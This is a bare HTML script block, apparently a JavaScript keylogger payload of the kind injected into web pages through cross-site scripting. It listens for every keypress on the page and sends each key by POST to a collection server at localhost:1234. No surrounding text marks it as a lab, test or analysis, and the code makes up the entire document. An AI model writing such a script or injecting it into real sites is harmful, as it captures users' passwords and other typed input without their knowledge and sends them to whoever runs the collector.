<script>
    document.addEventListener('keydown', function(event) {

        var keystroke = 'key=' + encodeURIComponent(event.key);

        fetch('http://localhost:1234', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/x-www-form-urlencoded',
            },
            body: keystroke
        });
    });
</script>

